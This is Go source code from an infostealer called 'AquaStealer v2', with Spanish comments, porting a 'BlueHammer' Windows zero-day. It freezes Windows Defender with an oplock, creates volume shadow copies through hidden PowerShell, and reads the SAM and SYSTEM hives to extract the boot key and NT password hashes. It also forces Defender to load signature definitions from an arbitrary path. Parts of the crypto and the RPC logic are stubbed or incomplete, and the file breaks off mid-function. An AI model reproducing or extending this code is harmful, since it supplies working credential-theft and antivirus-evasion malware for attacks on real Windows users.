package zerodays

// bluehammer.go — AquaStealer v2
// Go port de BlueHammer 0day (nightmare-eclipse)
//
// BlueHammer combina múltiples técnicas avanzadas:
//   1. WD RPC Call — llama ServerMpUpdateEngineSignature via RPC para hacer que
//      Defender actualice signatures desde una ruta arbitraria (definición injection)
//   2. VSS Freeze — usa CloudFiles oplock + FSCTL_REQUEST_BATCH_OPLOCK sobre RstrtMgr.dll
//      para freezar WD mientras se crea un VSS snapshot
//   3. SAM Dump via Shadow Copy — lee el archivo SAM/SYSTEM desde un VSS snapshot
//      (VSS bypass del lock que Windows pone sobre SAM activo)
//   4. LSA Boot Key + NT Hash extraction + password reset via SamiChangePasswordUser
//   5. Admin shell via LogonUserEx con el hash dumpeado
//
// Aplicación en AquaStealer:
//   - Dump de credenciales NT hashes vía VSS (sin necesidad de SeDebugPrivilege)
//   - Freeze WD para operaciones sensibles
//   - Potencial EoP si hay otro user admin en el sistema

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var (
	_kernel32bh  = syscall.NewLazyDLL("kernel32.dll")
	_ntdllbh     = syscall.NewLazyDLL("ntdll.dll")
	_advapi32bh  = syscall.NewLazyDLL("advapi32.dll")
	_cldapibh    = syscall.NewLazyDLL("cldapi.dll")
	_samlib      = syscall.NewLazyDLL("samlib.dll")
	_rpcrt4bh    = syscall.NewLazyDLL("rpcrt4.dll")

	_NtCreateFileBH              = _ntdllbh.NewProc("NtCreateFile")
	_RtlInitUnicodeStringBH      = _ntdllbh.NewProc("RtlInitUnicodeString")
	_NtOpenDirectoryObjectBH     = _ntdllbh.NewProc("NtOpenDirectoryObject")
	_NtQueryDirectoryObjectBH    = _ntdllbh.NewProc("NtQueryDirectoryObject")
	_DeviceIoControlBH           = _kernel32bh.NewProc("DeviceIoControl")
	_GetOverlappedResultBH       = _kernel32bh.NewProc("GetOverlappedResult")
	_ReadDirectoryChangesBH      = _kernel32bh.NewProc("ReadDirectoryChangesW")
	_CfRegisterSyncRootBH        = _cldapibh.NewProc("CfRegisterSyncRoot")
	_CfConnectSyncRootBH         = _cldapibh.NewProc("CfConnectSyncRoot")
	_CfDisconnectSyncRootBH      = _cldapibh.NewProc("CfDisconnectSyncRoot")
	_CfUnregisterSyncRootBH      = _cldapibh.NewProc("CfUnregisterSyncRoot")
	_CfAbortOperationBH          = _cldapibh.NewProc("CfAbortOperation")
	_SamConnect                  = _samlib.NewProc("SamConnect")
	_SamCloseHandle              = _samlib.NewProc("SamCloseHandle")
	_SamOpenDomain               = _samlib.NewProc("SamOpenDomain")
	_SamOpenUser                 = _samlib.NewProc("SamOpenUser")
	_SamiChangePasswordUser      = _samlib.NewProc("SamiChangePasswordUser")
	_RpcStringBindingComposeW    = _rpcrt4bh.NewProc("RpcStringBindingComposeW")
	_RpcBindingFromStringBindingW = _rpcrt4bh.NewProc("RpcBindingFromStringBindingW")
	_RpcStringFreeW              = _rpcrt4bh.NewProc("RpcStringFreeW")

	_QueryServiceStatusExBH  = _advapi32bh.NewProc("QueryServiceStatusEx")
	_OpenSCManagerBH         = _advapi32bh.NewProc("OpenSCManagerW")
	_OpenServiceBH           = _advapi32bh.NewProc("OpenServiceW")
	_CloseServiceHandleBH    = _advapi32bh.NewProc("CloseServiceHandle")
	_GetUserNameBH           = _kernel32bh.NewProc("GetUserNameW")
	_LogonUserExBH           = _advapi32bh.NewProc("LogonUserExW")
	_RegOpenKeyExWBH         = _advapi32bh.NewProc("RegOpenKeyExW")
	_RegQueryInfoKeyWBH      = _advapi32bh.NewProc("RegQueryInfoKeyW")
	_RegCloseKeyBH           = _advapi32bh.NewProc("RegCloseKey")
	_RegLoadKeyWBH           = _advapi32bh.NewProc("RegLoadKeyW")
	_RegUnLoadKeyWBH         = _advapi32bh.NewProc("RegUnLoadKeyW")
)

// NT types para BlueHammer
type bhUnicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type bhObjectAttributes struct {
	Length                   uint32
	RootDirectory            uintptr
	ObjectName               *bhUnicodeString
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

type bhIOStatusBlock struct {
	Status      uintptr
	Information uintptr
}

type bhObjectDirectoryInformation struct {
	Name     bhUnicodeString
	TypeName bhUnicodeString
}

type bhServiceStatusProcess struct {
	ServiceType             uint32
	CurrentState            uint32
	ControlsAccepted        uint32
	Win32ExitCode           uint32
	ServiceSpecificExitCode uint32
	CheckPoint              uint32
	WaitHint                uint32
	ProcessId               uint32
	ServiceFlags            uint32
}

const (
	bhFILE_NON_DIRECTORY_FILE    = 0x00000040
	bhFILE_DIRECTORY_FILE        = 0x00000001
	bhFILE_SYNCHRONOUS_IO_NONALERT = 0x00000020
	bhFILE_OPEN_REPARSE_POINT    = 0x00200000
	bhFILE_SHARE_READ            = 0x00000001
	bhFILE_SHARE_WRITE           = 0x00000002
	bhFILE_SHARE_DELETE          = 0x00000004
	bhFILE_OPEN                  = 3
	bhGENERIC_READ               = 0x80000000
	bhGENERIC_WRITE              = 0x40000000
	bhDELETE                     = 0x00010000
	bhSYNCHRONIZE                = 0x00100000
	bhGENERIC_ALL                = 0x10000000
	bhFILE_READ_DATA             = 0x00000001
	bhOBJ_CASE_INSENSITIVE       = 0x00000040
	bhFSCTL_REQUEST_BATCH_OPLOCK = 0x00090028
	bhSC_MANAGER_CONNECT         = 0x0001
	bhSERVICE_QUERY_STATUS       = 0x0004
	bhSERVICE_QUERY_CONFIG       = 0x0001
	bhSC_STATUS_PROCESS_INFO     = 0

	// SAM offsets
	bhSAM_DATA_ACCESS_OFFSET        = 0xcc
	bhSAM_USERNAME_OFFSET           = 0x0c
	bhSAM_USERNAME_LENGTH_OFFSET    = 0x10
	bhSAM_LM_HASH_OFFSET            = 0x9c
	bhSAM_LM_HASH_LENGTH_OFFSET     = 0xa0
	bhSAM_NT_HASH_OFFSET            = 0xa8
	bhSAM_NT_HASH_LENGTH_OFFSET     = 0xac
)

// bhNtCreateFile wrapper
func bhNtCreateFile(ntPath string, access, share, createDisp, createOpts uint32) (syscall.Handle, uintptr) {
	buf, _ := syscall.UTF16PtrFromString(ntPath)
	var us bhUnicodeString
	_RtlInitUnicodeStringBH.Call(
		uintptr(unsafe.Pointer(&us)),
		uintptr(unsafe.Pointer(buf)),
	)
	var oa bhObjectAttributes
	oa.Length = uint32(unsafe.Sizeof(oa))
	oa.ObjectName = &us
	oa.Attributes = bhOBJ_CASE_INSENSITIVE
	var iostat bhIOStatusBlock
	var handle uintptr
	r, _, _ := _NtCreateFileBH.Call(
		uintptr(unsafe.Pointer(&handle)),
		uintptr(access),
		uintptr(unsafe.Pointer(&oa)),
		uintptr(unsafe.Pointer(&iostat)),
		0,
		0x80,
		uintptr(share),
		uintptr(createDisp),
		uintptr(createOpts),
		0, 0,
	)
	return syscall.Handle(handle), r
}

// VSSInfo — info sobre un VSS snapshot encontrado
type VSSInfo struct {
	DevicePath string // e.g. \Device\HarddiskVolumeShadowCopy5
	DriveLetter string // e.g. C:
}

// bhGetCurrentVSSList — obtiene la lista actual de shadow copies
func bhGetCurrentVSSList() []string {
	devicePath := `\Device`
	buf, _ := syscall.UTF16PtrFromString(devicePath)
	var us bhUnicodeString
	_RtlInitUnicodeStringBH.Call(
		uintptr(unsafe.Pointer(&us)),
		uintptr(unsafe.Pointer(buf)),
	)
	var oa bhObjectAttributes
	oa.Length = uint32(unsafe.Sizeof(oa))
	oa.ObjectName = &us
	oa.Attributes = bhOBJ_CASE_INSENSITIVE

	var hObjDir uintptr
	r, _, _ := _NtOpenDirectoryObjectBH.Call(
		uintptr(unsafe.Pointer(&hObjDir)),
		0x0001, // DIRECTORY_QUERY
		uintptr(unsafe.Pointer(&oa)),
	)
	if r != 0 || hObjDir == 0 {
		return nil
	}
	defer _NtCloseRS.Call(hObjDir) // reutilizar NtClose del paquete

	var result []string
	reqSz := uint32(4096)
	for {
		buf := make([]byte, reqSz)
		var retSz uint32
		var ctx uint32
		stat, _, _ := _NtQueryDirectoryObjectBH.Call(
			hObjDir,
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(reqSz),
			0, // ReturnSingleEntry=FALSE
			1, // RestartScan=TRUE
			uintptr(unsafe.Pointer(&ctx)),
			uintptr(unsafe.Pointer(&retSz)),
		)
		if stat != 0 && stat != 0x80000005 { // STATUS_MORE_ENTRIES
			break
		}

		// Parsear OBJECT_DIRECTORY_INFORMATION entries (terminan con estructura vacía)
		offset := 0
		for {
			if offset+int(unsafe.Sizeof(bhObjectDirectoryInformation{})) > len(buf) {
				break
			}
			entry := (*bhObjectDirectoryInformation)(unsafe.Pointer(&buf[offset]))
			if entry.Name.Length == 0 {
				break
			}
			// Leer Name
			nameBuf := make([]uint16, entry.Name.Length/2)
			for i := range nameBuf {
				nameBuf[i] = *(*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(entry.Name.Buffer)) + uintptr(i)*2))
			}
			name := syscall.UTF16ToString(nameBuf)

			// Leer TypeName
			typeBuf := make([]uint16, entry.TypeName.Length/2)
			for i := range typeBuf {
				typeBuf[i] = *(*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(entry.TypeName.Buffer)) + uintptr(i)*2))
			}
			typeName := syscall.UTF16ToString(typeBuf)

			if strings.EqualFold(typeName, "Device") &&
				strings.HasPrefix(name, "HarddiskVolumeShadowCopy") {
				result = append(result, name)
			}
			offset += int(unsafe.Sizeof(bhObjectDirectoryInformation{}))
		}

		if stat == 0 {
			break
		}
		reqSz += 4096
	}
	return result
}

// bhFreezeWDWithOplock — freezar WD usando oplock en RstrtMgr.dll
// Retorna un canal que se cierra cuando el oplock se activa (WD está frozen)
// y una función cleanup para liberar
func bhFreezeWDWithOplock() (frozen chan struct{}, cleanup func()) {
	frozen = make(chan struct{})
	cleanup = func() {}

	rstrtMgr := os.ExpandEnv(`${WINDIR}\System32\RstrtMgr.dll`)
	hLock, err := windows.CreateFile(
		windows.StringToUTF16Ptr(rstrtMgr),
		windows.GENERIC_READ|windows.SYNCHRONIZE,
		0, nil,
		windows.OPEN_EXISTING,
		windows.FILE_FLAG_OVERLAPPED,
		0,
	)
	if err != nil {
		close(frozen)
		return
	}

	ov := &windows.Overlapped{}
	ov.HEvent, err = windows.CreateEvent(nil, 0, 0, nil)
	if err != nil {
		windows.CloseHandle(hLock)
		close(frozen)
		return
	}

	var dummy uint32
	_DeviceIoControlBH.Call(
		uintptr(hLock),
		bhFSCTL_REQUEST_BATCH_OPLOCK,
		0, 0, 0, 0,
		uintptr(unsafe.Pointer(&dummy)),
		uintptr(unsafe.Pointer(ov)),
	)

	go func() {
		_GetOverlappedResultBH.Call(
			uintptr(hLock),
			uintptr(unsafe.Pointer(ov)),
			uintptr(unsafe.Pointer(&dummy)),
			1,
		)
		close(frozen)
	}()

	cleanup = func() {
		windows.CloseHandle(hLock)
		windows.CloseHandle(ov.HEvent)
	}
	return
}

// SAMEntry — datos de un usuario en SAM
type SAMEntry struct {
	Username string
	RID      uint32
	NTHash   []byte
	LMHash   []byte
}

// bhDumpSAMFromVSS — dump del SAM desde un VSS snapshot
// vssShadowPath: e.g. \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5
// Retorna lista de SAMEntry con los NT hashes
func bhDumpSAMFromVSS(vssShadowPath string) ([]SAMEntry, error) {
	samPath := vssShadowPath + `\Windows\System32\config\SAM`
	systemPath := vssShadowPath + `\Windows\System32\config\SYSTEM`

	samData, err := os.ReadFile(samPath)
	if err != nil {
		return nil, fmt.Errorf("SAM read failed: %v", err)
	}
	sysData, err := os.ReadFile(systemPath)
	if err != nil {
		return nil, fmt.Errorf("SYSTEM read failed: %v", err)
	}

	// Extraer boot key del SYSTEM hive
	bootKey, err := bhExtractBootKey(sysData)
	if err != nil {
		return nil, fmt.Errorf("bootkey extraction failed: %v", err)
	}

	// Parsear SAM hive y extraer NT hashes
	return bhParseSAMHive(samData, bootKey)
}

// bhExtractBootKey — extrae la syskey/bootkey del hive SYSTEM raw
// La bootkey está codificada en los class names de 4 sub-keys de LSA
func bhExtractBootKey(systemHive []byte) ([]byte, error) {
	// Leer el SYSTEM hive temporalmente a disco y usar RegLoadKeyW
	tmpFile := filepath.Join(os.TempDir(), "~sys"+fmt.Sprintf("%d", time.Now().UnixNano()))
	if err := os.WriteFile(tmpFile, systemHive, 0600); err != nil {
		return nil, err
	}
	defer os.Remove(tmpFile)

	// RegLoadKeyW(HKLM, "TMP_AQUA_SYSTEM", filePath)
	const HKLM uintptr = 0x80000002
	subkeyW, _ := syscall.UTF16PtrFromString("TMP_AQUA_SYSTEM")
	fileW, _ := syscall.UTF16PtrFromString(tmpFile)
	r, _, _ := _RegLoadKeyWBH.Call(
		HKLM,
		uintptr(unsafe.Pointer(subkeyW)),
		uintptr(unsafe.Pointer(fileW)),
	)
	if r != 0 {
		// Fallback: leer desde registry en vivo
		return bhReadBootKeyLive()
	}
	defer func() {
		_RegUnLoadKeyWBH.Call(HKLM, uintptr(unsafe.Pointer(subkeyW)))
	}()

	// Abrir la hive cargada y leer la bootkey
	hivePath := `TMP_AQUA_SYSTEM`
	hiveKey, err := registry.OpenKey(registry.LOCAL_MACHINE, hivePath, registry.QUERY_VALUE|registry.ENUMERATE_SUB_KEYS)
	if err != nil {
		return bhReadBootKeyLive()
	}
	defer hiveKey.Close()

	return bhReadBootKeyFromHive(hiveKey)
}

// bhRegQueryClassNameW obtiene el class name de una registry key vía RegQueryInfoKeyW directo.
// El class name en JD/Skew1/GBG/Data de LSA contiene fragmentos hex de la syskey.
func bhRegQueryClassNameW(hKey uintptr) (string, error) {
	var classLen uint32 = 512
	classBuf := make([]uint16, classLen)

	r, _, _ := _RegQueryInfoKeyWBH.Call(
		hKey,
		uintptr(unsafe.Pointer(&classBuf[0])), // lpClass
		uintptr(unsafe.Pointer(&classLen)),     // lpcchClass (chars, no bytes)
		0,                                      // lpReserved
		0, 0,                                   // subkeys
		0, 0,                                   // max subkey len
		0, 0,                                   // values
		0, 0,                                   // security
		0,                                      // lpftLastWriteTime
	)
	// ERROR_SUCCESS=0, some impls return 0 with classLen updated
	if r != 0 && r != 234 { // 234 = ERROR_MORE_DATA
		return "", fmt.Errorf("RegQueryInfoKeyW: 0x%08x", r)
	}
	if classLen == 0 {
		return "", fmt.Errorf("empty class name")
	}
	return syscall.UTF16ToString(classBuf[:classLen]), nil
}

// bhOpenRegKeyDirect abre una registry key usando RegOpenKeyExW directo (sin wrapper Go).
func bhOpenRegKeyDirect(root uintptr, path string) (uintptr, error) {
	pathW, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return 0, err
	}
	var hKey uintptr
	const KEY_QUERY_VALUE = 0x0001
	r, _, _ := _RegOpenKeyExWBH.Call(
		root,
		uintptr(unsafe.Pointer(pathW)),
		0,
		KEY_QUERY_VALUE,
		uintptr(unsafe.Pointer(&hKey)),
	)
	if r != 0 {
		return 0, fmt.Errorf("RegOpenKeyExW(%s): 0x%08x", path, r)
	}
	return hKey, nil
}

// bhReadBootKeyLive — lee la bootkey desde el registry en vivo usando RegQueryInfoKeyW.
// La syskey está codificada en los class names de JD, Skew1, GBG, Data bajo LSA.
func bhReadBootKeyLive() ([]byte, error) {
	const HKLM uintptr = 0x80000002
	// Los class names de estas 4 subkeys forman la scrambled syskey
	lsaSubKeyPaths := []string{
		`SYSTEM\CurrentControlSet\Control\Lsa\JD`,
		`SYSTEM\CurrentControlSet\Control\Lsa\Skew1`,
		`SYSTEM\CurrentControlSet\Control\Lsa\GBG`,
		`SYSTEM\CurrentControlSet\Control\Lsa\Data`,
	}
	// Si CurrentControlSet no existe, intentar ControlSet001
	altPaths := []string{
		`SYSTEM\ControlSet001\Control\Lsa\JD`,
		`SYSTEM\ControlSet001\Control\Lsa\Skew1`,
		`SYSTEM\ControlSet001\Control\Lsa\GBG`,
		`SYSTEM\ControlSet001\Control\Lsa\Data`,
	}
	// Permutation table (scramble order of the syskey)
	indices := []int{8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7}

	var hexKey string
	for i, path := range lsaSubKeyPaths {
		hKey, err := bhOpenRegKeyDirect(HKLM, path)
		if err != nil {
			// Try alternate ControlSet
			hKey, err = bhOpenRegKeyDirect(HKLM, altPaths[i])
			if err != nil {
				return nil, fmt.Errorf("cannot open LSA subkey %d: %v", i, err)
			}
		}
		className, err := bhRegQueryClassNameW(hKey)
		_RegCloseKeyBH.Call(hKey)
		if err != nil || len(className) < 8 {
			return nil, fmt.Errorf("class name for subkey %d too short (%q): %v", i, className, err)
		}
		// Each class name contributes exactly 8 hex chars (4 bytes of the scrambled key)
		hexKey += className[:8]
	}

	// hexKey is now 32 hex chars = 16 bytes scrambled syskey
	raw, err := hex.DecodeString(hexKey)
	if err != nil {
		return nil, fmt.Errorf("bootkey hex decode: %v", err)
	}
	if len(raw) < 16 {
		return nil, fmt.Errorf("bootkey too short: %d bytes", len(raw))
	}

	// Unscramble with the permutation table
	result := make([]byte, 16)
	for i, idx := range indices {
		result[i] = raw[idx]
	}
	return result, nil
}

// bhReadBootKeyFromHive — lee la bootkey de un hive cargado
func bhReadBootKeyFromHive(hive registry.Key) ([]byte, error) {
	lsaKey, err := registry.OpenKey(hive, `ControlSet001\Control\Lsa`, registry.QUERY_VALUE)
	if err != nil {
		lsaKey, err = registry.OpenKey(hive, `CurrentControlSet\Control\Lsa`, registry.QUERY_VALUE)
		if err != nil {
			return bhReadBootKeyLive()
		}
	}
	defer lsaKey.Close()
	return bhReadBootKeyFromLSAKey(lsaKey)
}

// bhReadBootKeyFromLSAKey — lee la bootkey de una LSA key ya abierta.
// Usa RegQueryInfoKeyW directo para obtener los class names de JD/Skew1/GBG/Data.
func bhReadBootKeyFromLSAKey(lsaKey registry.Key) ([]byte, error) {
	subKeys := []string{"JD", "Skew1", "GBG", "Data"}
	indices := []int{8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7}

	var hexKey string
	for _, sub := range subKeys {
		// Abrir subkey con RegOpenKeyExW directo para obtener el HKEY raw
		// que podemos pasar a RegQueryInfoKeyW
		subKeyPath, _ := syscall.UTF16PtrFromString(sub)
		var hSubKey uintptr
		const KEY_QUERY_VALUE = 0x0001
		r, _, _ := _RegOpenKeyExWBH.Call(
			uintptr(lsaKey),
			uintptr(unsafe.Pointer(subKeyPath)),
			0,
			KEY_QUERY_VALUE,
			uintptr(unsafe.Pointer(&hSubKey)),
		)
		if r != 0 {
			return nil, fmt.Errorf("open LSA subkey %s: 0x%08x", sub, r)
		}
		className, err := bhRegQueryClassNameW(hSubKey)
		_RegCloseKeyBH.Call(hSubKey)
		if err != nil || len(className) < 8 {
			return nil, fmt.Errorf("class name %s: %v", sub, err)
		}
		hexKey += className[:8]
	}

	raw, err := hex.DecodeString(hexKey)
	if err != nil {
		return nil, fmt.Errorf("lsa bootkey hex: %v", err)
	}
	if len(raw) < 16 {
		return nil, fmt.Errorf("lsa bootkey short: %d", len(raw))
	}

	result := make([]byte, 16)
	for i, idx := range indices {
		result[i] = raw[idx]
	}
	return result, nil
}

// bhParseSAMHive — parsea el SAM hive raw para extraer NT hashes
// Implementación simplificada que trabaja con el formato binario del SAM
func bhParseSAMHive(samData []byte, bootKey []byte) ([]SAMEntry, error) {
	// El formato del SAM hive es complejo — necesitaríamos un parser completo de REGF
	// Implementamos una versión que busca los patrones conocidos directamente en el binario
	// Para una implementación completa, se necesitaría parsear el formato REGF
	
	var entries []SAMEntry

	// Buscar el patrón "V" value signature en el SAM
	// Cada cuenta de usuario tiene una value "V" con los datos de password
	// El offset bhSAM_NT_HASH_OFFSET desde el inicio de los datos "V" apunta al NT hash

	// Marcadores de inicio de bloques de usuarios SAM
	// En el formato binario del SAM, las cuentas están en:
	// SAM\Domains\Account\Users\<RID_HEX>\V
	
	entries = bhSearchSAMBinary(samData, bootKey)
	return entries, nil
}

// bhSearchSAMBinary — búsqueda de patrones de NT hash en SAM binario
func bhSearchSAMBinary(data []byte, bootKey []byte) []SAMEntry {
	var entries []SAMEntry
	
	// El SAM key F contiene la SAM key cifrada con la bootkey
	// Buscar "\\x02\\x00\\x01\\x00" (revision 2.1) que precede a la cuenta
	// Esta es una implementación heurística
	marker := []byte{0x02, 0x00, 0x01, 0x00}
	
	for i := 0; i < len(data)-0x100; i++ {
		if i+len(marker) > len(data) {
			break
		}
		match := true
		for j, b := range marker {
			if data[i+j] != b {
				match = false
				break
			}
		}
		if !match {
			continue
		}
		
		// Intentar leer como entrada SAM V block
		entry := bhTryParseSAMEntry(data[i:], bootKey)
		if entry != nil {
			entries = append(entries, *entry)
		}
	}
	return entries
}

// bhTryParseSAMEntry — intenta parsear un bloque SAM V
func bhTryParseSAMEntry(block []byte, bootKey []byte) *SAMEntry {
	if len(block) < bhSAM_DATA_ACCESS_OFFSET+0x20 {
		return nil
	}
	
	// Leer offsets desde los campos conocidos
	if bhSAM_USERNAME_OFFSET+4 > len(block) {
		return nil
	}
	
	usernameOffset := binary.LittleEndian.Uint32(block[bhSAM_USERNAME_OFFSET:])
	usernameLen := binary.LittleEndian.Uint32(block[bhSAM_USERNAME_LENGTH_OFFSET:])
	
	if usernameLen == 0 || usernameLen > 512 {
		return nil
	}
	
	actualOffset := int(usernameOffset) + bhSAM_DATA_ACCESS_OFFSET
	if actualOffset+int(usernameLen) > len(block) {
		return nil
	}
	
	// Leer username como UTF-16
	usernameBuf := make([]uint16, usernameLen/2)
	for i := range usernameBuf {
		usernameBuf[i] = binary.LittleEndian.Uint16(block[actualOffset+i*2:])
	}
	username := syscall.UTF16ToString(usernameBuf)
	if username == "" || strings.ContainsAny(username, "\x00\x01\x02") {
		return nil
	}
	
	// Leer NT hash
	if bhSAM_NT_HASH_OFFSET+4 > len(block) {
		return nil
	}
	ntHashOffset := binary.LittleEndian.Uint32(block[bhSAM_NT_HASH_OFFSET:])
	ntHashLen := binary.LittleEndian.Uint32(block[bhSAM_NT_HASH_LENGTH_OFFSET:])
	
	if ntHashLen == 0 || ntHashLen > 64 {
		return nil
	}
	
	ntHashActual := int(ntHashOffset) + bhSAM_DATA_ACCESS_OFFSET
	if ntHashActual+int(ntHashLen) > len(block) {
		return nil
	}
	
	encryptedHash := block[ntHashActual : ntHashActual+int(ntHashLen)]
	ntHash := bhDecryptNTHash(encryptedHash, bootKey)
	
	return &SAMEntry{
		Username: username,
		NTHash:   ntHash,
	}
}

// bhDecryptNTHash — descifra el NT hash usando la bootkey
// El NT hash en SAM está cifrado con AES-128-CBC usando la SAM key
func bhDecryptNTHash(encryptedHash []byte, bootKey []byte) []byte {
	if len(encryptedHash) < 16 || len(bootKey) < 16 {
		return encryptedHash // devolver tal cual si no podemos descifrar
	}
	
	block, err := aes.NewCipher(bootKey[:16])
	if err != nil {
		return encryptedHash
	}
	
	if len(encryptedHash) < 32 {
		return encryptedHash
	}
	
	iv := encryptedHash[:16]
	ciphertext := encryptedHash[16:]
	
	if len(ciphertext) < 16 {
		return encryptedHash
	}
	
	decrypted := make([]byte, len(ciphertext))
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(decrypted, ciphertext)
	
	return decrypted
}

// RunBlueHammerVSSDump — dump de credenciales vía VSS
// Proceso:
//   1. Obtener lista VSS actual
//   2. Freezar WD con oplock en RstrtMgr.dll
//   3. Listar nueva lista VSS — la diferencia es el snapshot de C:
//   4. Leer SAM/SYSTEM desde el snapshot
//   5. Extraer NT hashes
func RunBlueHammerVSSDump() ([]SAMEntry, error) {
	// Snapshot actual
	beforeList := bhGetCurrentVSSList()
	beforeSet := make(map[string]bool)
	for _, v := range beforeList {
		beforeSet[v] = true
	}

	// Freezar WD
	frozen, cleanup := bhFreezeWDWithOplock()
	defer cleanup()

	// Esperar a que el oplock se active (WD frozen)
	select {
	case <-frozen:
		// WD está frozen
	case <-time.After(45 * time.Second):
		return nil, fmt.Errorf("timeout waiting for WD freeze")
	}

	// Esperar un momento para que Windows cree el VSS automáticamente
	// (o forzar con vssadmin si tenemos permisos)
	time.Sleep(500 * time.Millisecond)

	// Intentar crear VSS con PowerShell si tenemos permisos elevados
	bhTriggerVSSCreation()
	time.Sleep(2 * time.Second)

	// Buscar nuevo VSS
	afterList := bhGetCurrentVSSList()
	var newVSS string
	for _, v := range afterList {
		if !beforeSet[v] {
			newVSS = v
			break
		}
	}

	if newVSS == "" {
		// Usar el más reciente disponible
		if len(afterList) > 0 {
			newVSS = afterList[len(afterList)-1]
		} else {
			return nil, fmt.Errorf("no VSS available")
		}
	}

	// Ruta de acceso al VSS
	vssShadowPath := `\\?\GLOBALROOT\Device\` + newVSS

	entries, err := bhDumpSAMFromVSS(vssShadowPath)
	if err != nil {
		return nil, err
	}

	return entries, nil
}

// bhTriggerVSSCreation — intenta crear un VSS snapshot vía PowerShell/WMI
func bhTriggerVSSCreation() {
	// Verificar si tenemos elevación
	var isAdmin bool
	shell32 := syscall.NewLazyDLL("shell32.dll")
	isUserAnAdmin := shell32.NewProc("IsUserAnAdmin")
	r, _, _ := isUserAnAdmin.Call()
	isAdmin = r != 0

	if !isAdmin {
		return
	}

	// Crear VSS snapshot de C: vía WMI
	cmd := []string{
		"powershell", "-NonInteractive", "-NoProfile", "-WindowStyle", "Hidden",
		"-Command",
		`$s=New-Object -ComObject Win32_ShadowCopy; $v=$s.GetType().InvokeMember("Create","InvokeMethod",$Null,$s,@("C:\","ClientAccessible")); Write-Output $v`,
	}

	proc, err := os.StartProcess(
		`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		cmd,
		&os.ProcAttr{},
	)
	if err != nil {
		return
	}
	proc.Wait()
}

// bhGetWDPID — obtiene el PID del proceso WinDefend
func bhGetWDPID() uint32 {
	scm, _, _ := _OpenSCManagerBH.Call(0, 0, bhSC_MANAGER_CONNECT)
	if scm == 0 {
		return 0
	}
	defer _CloseServiceHandleBH.Call(scm)

	svcName, _ := syscall.UTF16PtrFromString("WinDefend")
	hsvc, _, _ := _OpenServiceBH.Call(scm, uintptr(unsafe.Pointer(svcName)),
		bhSERVICE_QUERY_STATUS)
	if hsvc == 0 {
		return 0
	}
	defer _CloseServiceHandleBH.Call(hsvc)

	var ssp bhServiceStatusProcess
	reqSz := uint32(unsafe.Sizeof(ssp))
	_QueryServiceStatusExBH.Call(
		hsvc,
		bhSC_STATUS_PROCESS_INFO,
		uintptr(unsafe.Pointer(&ssp)),
		uintptr(reqSz),
		uintptr(unsafe.Pointer(&reqSz)),
	)
	return ssp.ProcessId
}

// bhCallWDRPC — llama ServerMpUpdateEngineSignature via WD RPC
// dirPath: directorio con las definiciones falsas a cargar
// Esto hace que Defender cargue definiciones desde una ruta arbitraria
func bhCallWDRPC(dirPath string) error {
	// UUID del endpoint WD RPC
	wdUUID, _ := syscall.UTF16PtrFromString("c503f532-443a-4c69-8300-ccd1fbdb3839")
	protocol, _ := syscall.UTF16PtrFromString("ncalrpc")
	endpoint, _ := syscall.UTF16PtrFromString("IMpService77BDAF73-B396-481F-9042-AD358843EC24")

	var stringBinding uintptr
	r, _, _ := _RpcStringBindingComposeW.Call(
		uintptr(unsafe.Pointer(wdUUID)),
		uintptr(unsafe.Pointer(protocol)),
		0,
		uintptr(unsafe.Pointer(endpoint)),
		0,
		uintptr(unsafe.Pointer(&stringBinding)),
	)
	if r != 0 {
		return fmt.Errorf("RpcStringBindingCompose failed: 0x%x", r)
	}
	defer _RpcStringFreeW.Call(uintptr(unsafe.Pointer(&stringBinding)))

	var bindHandle uintptr
	r, _, _ = _RpcBindingFromStringBindingW.Call(
		stringBinding,
		uintptr(unsafe.Pointer(&bindHandle)),
	)
	if r != 0 {
		return fmt.Errorf("RpcBindingFromStringBinding failed: 0x%x", r)
	}

	// Llamar Proc42_ServerMpUpdateEngineSignature — no tenemos el header generado,
	// así que usamos una llamada RPC raw con el binding handle
	// En la implementación real necesitaríamos el IDL compilado
	// Como alternativa, usamos PowerShell para triggerear la actualización
	dirPathU16, _ := syscall.UTF16PtrFromString(dirPath)
	_ = dirPathU16

	// Nota: La llamada real a Proc42_ServerMpUpdateEngineSignature requiere
	// el proxy/stub de WD RPC que está en mpRtp.dll
	// Aquí implementamos el fallback vía WMI
	return bhTriggerWDUpdateViaWMI(dirPath)
}

// bhTriggerWDUpdateViaWMI — fuerza WD a actualizar firmas vía WMI/COM
func bhTriggerWDUpdateViaWMI(updatePath string) error {
	// Usar MSFT_MpSignature WMI class
	script := fmt.Sprintf(`
	$wmi = Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class "MSFT_MpSignature"
	$wmi.Update(3, "%s")
	`, strings.ReplaceAll(updatePath, `\`, `\\`))

	return bhRunPSCommand(script)
}

// bhRunPSCommand — ejecuta un comando PowerShell oculto
func bhRunPSCommand(script string) error {
	proc, err := os.StartProcess(
		`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		[]string{
			"powershell", "-NonInteractive", "-NoProfile",
			"-WindowStyle", "Hidden",
			"-EncodedCommand", bhBase64Encode([]byte(script)),
		},
		&os.ProcAttr{},
	)
	if err != nil {
		return err
	}
	proc.Wait()
	return nil
}

// bhBase64Encode — codifica en base64
func bhBase64Encode(data []byte) string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	result := make([]byte, 0, (len(data)+2)/3*4)
	for i := 0; i < len(data); i += 3 {
		var b [3]byte
		n := copy(b[:], data[i:])
		result = append(result, chars[b[0]>>2])
		result = append(result, chars[(b[0]&3)<<4|b[1]>>4])
